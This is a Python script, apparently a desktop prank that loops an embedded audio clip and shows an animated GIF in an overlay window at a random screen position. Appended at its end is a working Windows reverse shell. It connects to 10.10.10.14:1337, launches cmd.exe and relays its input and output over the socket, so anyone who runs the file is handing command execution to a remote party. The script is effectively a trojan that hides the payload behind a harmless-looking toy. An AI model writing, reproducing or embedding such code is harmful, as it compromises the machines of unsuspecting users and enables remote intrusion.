import tkinter as tk
import random as rd
from overlay import Window
import screeninfo
import tempfile
import base64
from pygame import mixer
import os,socket,subprocess,threading,sys;

IMAGE=""
AUDIO=base64.b64decode("")
AUDIO_FILE = tempfile.NamedTemporaryFile(suffix=".mp3",delete=False)
AUDIO_PATH = AUDIO_FILE.name
mixer.init()


#AUDIO_PATH=AUDIO_PATH.replace("\\","/")
AUDIO_FILE.write(AUDIO)
AUDIO_FILE.close()
mixer.music.load(AUDIO_PATH)
win = Window()


frameCnt=6
frames = [tk.PhotoImage(data=IMAGE,format = 'gif -index %i' %(i)) for i in range(frameCnt)]
label = tk.Label(win.root)
def update(ind):

    frame = frames[ind]
    ind += 1
    if ind == frameCnt:
        ind = 0
    label.configure(image=frame)
    win.root.after(25, update, ind)
mixer.music.play(loops=-1)
label.pack()
def on_exit():
    mixer.music.stop()
    mixer.stop()
    mixer.quit()
    win.destroy_all()
    


win.root.after(0, update, 0)
win.root.protocol("WM_DELETE_WINDOW", on_exit)
win.root.geometry(str(frames[0].width())+"x"+str(frames[0].height())+"+"+str(rd.randint(0,screeninfo.get_monitors()[0].width-frames[0].width()))+"+"+str(rd.randint(0,screeninfo.get_monitors()[0].height-frames[0].height())))
Window.launch()


server= str('10.10.10.14'); port=int('1337');
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((server,port))
def win():
   p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, 
   	                   stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
   s2p_thread = threading.Thread(target=s2p, args=[s, p])
   s2p_thread.daemon = True
   s2p_thread.start()
   p2s_thread = threading.Thread(target=p2s, args=[s, p])
   p2s_thread.daemon = True
   p2s_thread.start()
   p.wait()
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
try:
    win()
except KeyboardInterrupt:
    s.close()

